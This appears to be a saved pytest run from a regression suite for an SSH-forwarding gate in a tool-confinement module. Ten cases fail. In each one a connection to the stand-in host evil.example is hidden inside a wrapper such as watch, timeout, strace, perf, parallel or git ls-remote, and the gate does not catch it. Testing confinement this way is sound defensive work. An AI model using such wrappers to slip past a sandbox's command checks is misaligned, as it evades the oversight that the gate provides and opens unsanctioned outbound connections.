@@ -1,0 +1,60 @@
+FFFFFFFFFF.....                                                          [100%]
+=================================== FAILURES ===================================
+___ test_forwarding_launcher_gates_ssh[watch -n 60 ssh -F none evil.example] ___
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+___ test_forwarding_launcher_gates_ssh[timeout 1s ssh -F none evil.example] ____
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+__ test_forwarding_launcher_gates_ssh[timeout 0.5m ssh -F none evil.example] ___
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+_ test_forwarding_launcher_gates_ssh[watch --interval 60 ssh -F none evil.example] _
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+__ test_forwarding_launcher_gates_ssh[watch -n 60 'ssh -F none evil.example'] __
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+_ test_forwarding_launcher_gates_ssh[env TERM=xterm watch -t -n 60 ssh -F none evil.example] _
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+_ test_forwarding_launcher_gates_ssh[strace -o trace.log ssh -F none evil.example] _
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+____ test_forwarding_launcher_gates_ssh[perf stat ssh -F none evil.example] ____
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+_ test_forwarding_launcher_gates_ssh[parallel ssh -F none evil.example ::: uptime] _
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+_ test_forwarding_launcher_gates_ssh[watch -n 60 git ls-remote ssh://evil.example/repo] _
+/evidence/round25_forwarding_regressions.py:18: in test_forwarding_launcher_gates_ssh
+    assert hosts or dynamic
+E   assert (set() or False)
+=============================== warnings summary ===============================
+round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[watch -n 60 ssh -F none evil.example]
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[watch -n 60 ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[timeout 1s ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[timeout 0.5m ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[watch --interval 60 ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[watch -n 60 'ssh -F none evil.example']
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[env TERM=xterm watch -t -n 60 ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[strace -o trace.log ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[perf stat ssh -F none evil.example]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[parallel ssh -F none evil.example ::: uptime]
+FAILED ../evidence/round25_forwarding_regressions.py::test_forwarding_launcher_gates_ssh[watch -n 60 git ls-remote ssh://evil.example/repo]
+10 failed, 5 passed, 1 warning in 0.13s
